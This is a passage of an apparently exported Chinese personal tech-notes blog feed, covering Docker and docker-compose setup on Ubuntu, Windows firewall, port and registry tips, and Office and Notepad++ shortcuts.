<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">docker</span> info

结果中显示了我们设置的镜像服务器地址，则说明设置已经生效，返回的信息类似下面这样：

Registry Mirrors:
 https://hub-mirror.c.163.com/
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h1>10. 运行hello-world验证docker-ce是否安装成功</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装成功显示</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/69c425d9-ff18-4d9d-ac66-2946ae3bd013.png" alt="img"></p>
<h1>11. 安装docker-compose</h1>
<ul>
<li>安装pip</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>更新一下库</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>更新一下pip</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>安装docker-compose</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> <span class="token function">docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>
<p>如果出错</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2020061322045958.png" alt="img"></p>
</li>
<li>
<p>就更新一下 six</p>
</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> six <span class="token parameter variable">--user</span> <span class="token parameter variable">-U</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>查看docker-compose版本</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200613220759470.png" alt="img"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu卸载图形界面</title>
    <url>/20221030/f075b7f2.html</url>
    <content><![CDATA[<p>1、打开终端（快捷键Ctrl + Alt + t）</p>
<p>2、卸载gnome-shell主程序</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove gnome-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>3、卸载掉gnome</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove gnome <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>4、卸载不需要的依赖关系</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> autoremove<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>5、彻底卸载删除gnome的相关配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> purge gnome<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>6、清理安装gnome时候留下的缓存程序软件包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> autoclean
<span class="token function">sudo</span> <span class="token function">apt-get</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>7、重启</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">shutdown</span> <span class="token parameter variable">-r</span> now<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>EXCEL使用记录</title>
    <url>/20221030/951bcc56.html</url>
    <content><![CDATA[<h1>输入时间</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ctrl+;</code></td>
<td><code>输入日期</code></td>
</tr>
<tr>
<td><code>ctrl+shift+#</code></td>
<td><code>应用含年，月，日的``“``日期``”``格式</code></td>
</tr>
<tr>
<td><code>ctrl+shift+;</code></td>
<td><code>插入时间</code></td>
</tr>
<tr>
<td><code>ctrl+shift+@</code></td>
<td><code>应用含小时和分钟并标明上午或下午的``“``时间``”``格式</code></td>
</tr>
</tbody>
</table>
<h1>显示被自动隐藏的单引号</h1>
<ol>
<li>
<p>设置单元格格式——数字选项卡——自定义：自己在那里输入 “'”@——确定！</p>
</li>
<li>
<p>使用公式：=“'”&amp;A2</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124164907695-1667118851035-16-1678131278661-19.png" alt="image-20211124164907695"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>办公软件</tag>
      </tags>
  </entry>
  <entry>
    <title>Notepad++</title>
    <url>/20221030/56d60381.html</url>
    <content><![CDATA[<h1>常用插件</h1>
<p>TextFx，Compare，NppAStyle</p>
<h1>整行删除快捷键</h1>
<p>特别说明一下，有网友说Notepad++自带删除行功能，用快捷键ctrl+L就可以删除一行。的确，这个快捷键是可以删除一行文本，但确切的说，ctrl+L并不是仅仅删除了一行文本，而是“剪切”了一行文本。</p>
<ol>
<li>
<p>前提条件：你已经在操作系统上妥当安装好了Notepad++，并运行它。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124163248651-1667118851034-10-1678131189030-1.png" alt="image-20211124163248651"></p>
</li>
<li>
<p>在空文档里随便输入一些字符、空行等内容。我这里是在空文档中粘贴了一篇短文。</p>
</li>
<li>
<p>将光标插入点定位在某一行上</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124163315253-1667118851034-11-1678131189030-3.png" alt="image-20211124163315253"></p>
</li>
<li>
<p>打开菜单：Macro（宏）–&gt;Start recording（录制宏）。<br>
提示：顺带说一下，“宏”是计算机方面的术语，我个人把它理解为“一系列动作或操作”（其实从编程人员的角度上来说，解释为动作脚本更贴切一些）。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124163346229-1667118851035-12-1678131189030-7.png" alt="image-20211124163346229"></p>
</li>
<li>
<p>开始在键盘上依次键入如下按键</p>
<pre class="line-numbers language-none"><code class="language-none">Space End(x2) Shift+Home(x2) Space Shift+Home Del(x2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">提示： 
Space 键盘上的空格键。 
End 键盘上的End键，在方向键的上面，与Insert、Home、Delete在一起 

（x2） 意思是要按两次。比如End（x2）就是要按End键两次。 

\+ 加号的意思是组合按键。比如Shift+Home（x2）的意思是先按下Shift键不要松开，然后再按两次Home键，然后松开所有按键。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>后用鼠标打开Macro（宏）菜单，选择Stop recording（停止录制宏），结束宏录制过程。至此，我们已经录制好了用于删除整行的宏。还没完，请继续往下看。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124163733994-1667118851035-13-1678131189030-5.png" alt="image-20211124163733994"></p>
</li>
<li>
<p>我们要保存录制好的宏，并为它定义一个快捷键，这样我们就能在编辑文本内容的时候方便的使用这条“删除整行文本”的宏了。保存宏：请鼠标点击Macro菜单，选择Save Current Recorded Macro（保存当前录制好的宏）菜单项。</p>
</li>
<li>
<p>根据下图中的描述完成宏命名以及定义快捷键的操作。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124164255570-1667118851035-15-1678131189030-9.png" alt="image-20211124164255570"></p>
</li>
<li>
<p>最后我们来试一下是否已经成功为Notepad++添加了这条整行删除操作。将光标定位到文本内容的一行，然后按下Ctrl+E键，看看是否将一行文本删除掉了。</p>
</li>
</ol>
<h1>删除重复行</h1>
<p>录制宏， 快捷键Ctrl+H，在弹出的界面输入表达式，并勾选匹配新行</p>
<pre class="line-numbers language-none"><code class="language-none">^(.*?)$\s+?^(?=.*^\1$)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124164401197-1667118851035-14-1678131189030-11.png" alt="image-20211124164401197"></p>
<h2 id="将代码保持高亮复制到word中">将代码保持高亮复制到word中</h2>
<ol>
<li>
<p>第一种：在vim编辑器下，用:TOhtml先转换成html,然后保存后用浏览器打开,在浏览器里复制,到word里面去粘帖,就可以保存住代码的高亮。</p>
</li>
<li>
<p>第二种：使用notepad++,这里有几种将代码保持高亮复制到word中的方法。</p>
<p>a.  选中当前要复制的代码</p>
<p>b. 选中代码后右键，选择如下命令</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124165338320-1667118851035-17-1678131462991-24.png" alt="image-20211124165338320"></p>
<p>另外，代码复制到word后也保留了notepad++中的背景色，所以为了让代码看起来更舒服，最好也调整一下notepad++的背景色。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124165401535-1667118851035-18-1678131462990-22.png" alt="image-20211124165401535"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>办公软件</tag>
      </tags>
  </entry>
  <entry>
    <title>Tim</title>
    <url>/20221030/13c89275.html</url>
    <content><![CDATA[<blockquote>
<p>TIM原个人文件夹所在磁盘被格式化之后，无法打开TIM</p>
</blockquote>
<h1>修改<code>UserDataInfo.ini</code></h1>
<ol>
<li>
<p>进入C:\Users\Public\Documents\Tencent\QQ文件夹下(没有则创建),创建UserDataInfo.ini文本文档</p>
</li>
<li>
<p>编辑UserDataInfo.ini文件,填入以下内容:</p>
<pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">[UserDataSet]
UserDataSavePathType<span class="token operator">=</span>2
UserDataSavePath<span class="token operator">=</span>D<span class="token punctuation">:</span>\Tencent\
NewVersion<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>D:\Tencent\即为个人文件夹位置</p>
</li>
</ol>
<h1>修改注册表</h1>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>办公软件</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows VPN连接报错</title>
    <url>/20230216/ede6579e.html</url>
    <content><![CDATA[<ul>
<li>
<p>问题描述</p>
<p>确认VPN信息正确的条件下，选择<code>PPTP</code>协议连接，提示 “不能建立到远程计算机的连接。你可能需要更改此连接的网络设置” 的错误</p>
</li>
<li>
<p>问题排除</p>
<p><code>event</code> 打开 <code>事件查看器</code>，获取VPN连接失败错误代码</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230216100057902.png" alt="image-20230216100057902"></p>
</li>
<li>
<p>搜索对应的问题描述：<a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/networking/troubleshoot-error-720-when-establishing-a-vpn-connection">尝试建立 VPN 连接时出现“失败后返回的错误代码为 720”</a></p>
</li>
<li>
<p>最终解决方案：重新安装 WAN 微型端口 (IP) 接口驱动程序</p>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 命令行命令记录</title>
    <url>/20230216/92ff07c.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>说明</th>
<th>命令</th>
</tr>
</thead>
<tbody>
<tr>
<td>ipconfig /flushdns</td>
<td>Windows刷新DNS命令</td>
</tr>
<tr>
<td>wmic memphysical get maxcapacity</td>
<td>查看支持的最大内存容量</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 开放服务器端口</title>
    <url>/20221030/bc0ce28b.html</url>
    <content><![CDATA[<h1>控制面板</h1>
<p>win7下打开端口测试端口时 可用telnet 命令侦听端口：<code>C:\Documents and Settings\administrator&gt;netstat -na</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124112102739-1678132121801-34.png" alt="image-20211124112102739"></p>
<p>测试端口是否开放：<br>
<code>C:\Documents and Settings\administrator&gt;telnet 127.0.0.1 8500</code><br>
正在连接到127.0.0.1…不能打开到主机的连接， 在端口 8500: 连接失败</p>
<p>下面开始打开端口（Win7）</p>
<p>Win7的防火墙做了比较大升级 设置已经分为入站和出站。下面以开通Tomcat的远程访问8080作为例子。<strong>控制面板–所有控制面板项–Windows 防火墙</strong> 进入</p>
<p>入站规则设置<br>
第一步 选择 入站规则 然后 新建规则，选择 端口，然后下一步<br>
第二步 选择TCP 选择特定端口 然后输入端口，如有多个端口需要用逗号隔开了 例如:88,8080<br>
第三步，选择允许连接<br>
第四步 选择应用规则的范围<br>
第五步 输入规则名称</p>
<p>出站规则设置<br>
第一步 选择 入站规则 然后 新建规则，选择 端口，然后下一步<br>
第二步 选择TCP 选择特定端口 然后输入端口，如有多个端口需要用逗号隔开了 例如:88,8080<br>
第三步，选择允许连接<br>
第四步 选择应用规则的范围<br>
第五步 输入规则名称<br>
至此，防火墙规则设置完毕，启用即可！<br>
另外win7的 IIS7，只需启用 入站规则：BranchCache 内容检索(HTTP-In)<br>
出站规则： BranchCache 内容检索(HTTP-Out) 即可。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124112849477-1678132121801-36.png" alt="image-20211124112849477"><br>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124113626250-1678132121801-38.png" alt="image-20211124113626250"><br>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124113803236-1678132121801-40.png" alt="image-20211124113803236"><br>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124113911637-1678132121801-44.png" alt="image-20211124113911637"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114010436-1678132121801-42.png" alt="image-20211124114010436"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114015918-1678132121801-46.png" alt="image-20211124114015918"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114021360-1678132121801-48.png" alt="image-20211124114021360"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114030488-1678132121801-50.png" alt="image-20211124114030488"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114034567-1678132121801-52.png" alt="image-20211124114034567"></p>
<p>输出规则也一样的设置 可以看到</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114043841-1678132121801-54.png" alt="image-20211124114043841"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124114050299-1678132121801-56.png" alt="image-20211124114050299"></p>
<h1>命令行</h1>
<pre class="line-numbers language-none"><code class="language-none">win10：netsh advfirewall firewall add rule name="ES Port 9300" dir=in action=allow protocol=TCP localport=9300<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>防火墙</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>WORD使用记录</title>
    <url>/20221030/8bc474d9.html</url>
    <content><![CDATA[<h1>插入复选框</h1>
<pre class="line-numbers language-none"><code class="language-none">输入“2611”，选中编号，按 “Alt+X”,是需要插入对勾,
输入“2612”，选中编号，按 “Alt+X”,是需要插入叉号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>插入带圈数字</h1>
<ol>
<li>
<p>切换到英文输入法，按小键盘Num Lock键启小键盘。</p>
</li>
<li>
<p>将光标移到输入带圈的符处，打小键盘2460，接着按组合键Alt +X松开，这时刚才显示的2460就转换成带圈字符①。<br>
打小键盘2473，接着按组合键Alt +X松开，这时刚才显示的2473就转换成带圈字符⑳。</p>
</li>
<li>
<p>以下是带圈数字1-20的代码对应关系：</p>
<pre class="line-numbers language-none"><code class="language-none">1/2460；
2/2461；
3/2462；
4/2463；
5/2464；
6/2465；
7/2466；
8/2467；
9/2468；
10/2469；
11/246a；
12/246b；
13/246c；
14/246d；
15/246e；
16/246f；
17/2470；
18/2471；
19/2472；
20/ 2473 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>20以上的暂没有快捷方式，可用其它方法输入，如用“格式”→“中文版式”→“带圈字符”来打。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>办公软件</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 快捷键</title>
    <url>/20221030/9dc5a8ca.html</url>
    <content><![CDATA[<h1>win+r 可执行的命令</h1>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>mstsc</td>
<td>打开远程连接</td>
</tr>
<tr>
<td>services.msc</td>
<td>本地服务设置</td>
</tr>
<tr>
<td>calc</td>
<td>计算器</td>
</tr>
<tr>
<td>dxdiag</td>
<td>系统配置查看命令</td>
</tr>
</tbody>
</table>
<h1>Windows系统快捷键记录</h1>
<table>
<thead>
<tr>
<th><strong>快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+Shift+Esc</td>
<td>打开任务管理器</td>
</tr>
<tr>
<td>Esc</td>
<td>取消当前任务</td>
</tr>
<tr>
<td>Shift+delete</td>
<td>永久删除所选的项目（删除之后无法从回收站还原）</td>
</tr>
<tr>
<td>Ctrl+shiff+tab</td>
<td>在选项卡上向后移动</td>
</tr>
<tr>
<td>Tab</td>
<td>在选项上向后移动</td>
</tr>
<tr>
<td>Shift+Tab</td>
<td>在选项卡上向前移动</td>
</tr>
</tbody>
</table>
<h1>Windows资源管理器中的快捷键</h1>
<table>
<thead>
<tr>
<th><strong>快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Alt+P</td>
<td>显示预览窗格</td>
</tr>
<tr>
<td>Alt+←</td>
<td>切换到前一次打开的文件夹</td>
</tr>
<tr>
<td>Alt+→</td>
<td>切换到下一次后打开的文件夹</td>
</tr>
<tr>
<td>Alt+↑</td>
<td>打开上层文件夹</td>
</tr>
<tr>
<td>Backspace</td>
<td>打开上层文件夹</td>
</tr>
</tbody>
</table>
<h1>Windows徽标键相关的快捷键</h1>
<table>
<thead>
<tr>
<th><strong>快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Win</td>
<td>打开或者关闭开始菜单</td>
</tr>
<tr>
<td>Win+Pause</td>
<td>显示系统属性对话框</td>
</tr>
<tr>
<td>Win+d</td>
<td>显示桌面</td>
</tr>
<tr>
<td>Win+m</td>
<td>最小化所有窗口</td>
</tr>
<tr>
<td>Win+Shift+m</td>
<td>还原最小化窗口到桌面上</td>
</tr>
<tr>
<td>Win+E</td>
<td>打开我的电脑</td>
</tr>
<tr>
<td>Win+F</td>
<td>搜索文件或文件夹</td>
</tr>
<tr>
<td>Win+L</td>
<td>锁定您的计算机或切换用户</td>
</tr>
<tr>
<td>Win+R</td>
<td>打开运行对话框</td>
</tr>
<tr>
<td>Win+↓</td>
<td>最小化窗口</td>
</tr>
<tr>
<td>Win+↑</td>
<td>最大化当前窗口</td>
</tr>
<tr>
<td>Win+←</td>
<td>最大化到窗口左侧的屏幕上</td>
</tr>
<tr>
<td>Win+→</td>
<td>最大化到窗口右侧的屏幕上</td>
</tr>
<tr>
<td>Win+home</td>
<td>最小化所有窗口，除了当前激活窗口</td>
</tr>
</tbody>
</table>
<h1>Windows 特殊文件路径</h1>
<table>
<thead>
<tr>
<th>说明</th>
<th>路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>开机启动程序路径</td>
<td>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</td>
</tr>
<tr>
<td>host文件位置</td>
<td>C:\Windows\System32\drivers\etc</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 查看端口占用</title>
    <url>/20221030/a43647c8.html</url>
    <content><![CDATA[<ol>
<li>
<p>获取占用端口的进程ID  <code>netstat -ano|findstr 10001</code></p>
</li>
<li>
<p>获取进程信息 <code>tasklist|findstr 9352</code></p>
</li>
<li>
<p>关闭进程（强行关闭） <code>taskkill /PID 9140 /T /F</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB基础</title>
    <url>/20221031/c5d54bc1.html</url>
    <content><![CDATA[<h1>Cha</h1>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 设置护眼颜色</title>
    <url>/20221030/af76b9e4.html</url>
    <content><![CDATA[<h1>颜色</h1>
<h2 id="豆沙绿">豆沙绿</h2>
<p>RGB（202，234，206），#CAEACE</p>
<h2 id="淡黄色">淡黄色</h2>
<p>RGB（253，246，227），#FDF6E3 【选用】</p>
<h1>过程</h1>
<ol>
<li>
<p>首先使用 Win + R 组合快捷键，打开“运行”，然后键入打开注册表命令「regedit」，按回车键确认打开，如图所示</p>
</li>
<li>
<p>打开Win10注册表之后，依次在左侧树状菜单中展开：HKEY_CURRENT_USER\Control Panel\Colors然后再右侧找到「Windows」值，并双击打开，将默认的255 255 255（默认是白色背景）三组颜色数值改成 253，246，227完成后，点击下方的“确定”保存，如图所示。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124002345774-1678131778293-28.png" alt="image.png"></p>
</li>
<li>
<p>继续找到注册表的路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\DefaultColors\Standard</p>
<p>同样再在右侧找到「Windows」双击打开，将默认的数据值 ffffff 改成  FDF6E3 完成后，点击下方的确定保存如下图所示。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124002408921-1678131778293-30.png" alt="image.png"></p>
<p>完成以上三步操作后，需要重启电脑生效</p>
</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
</search>
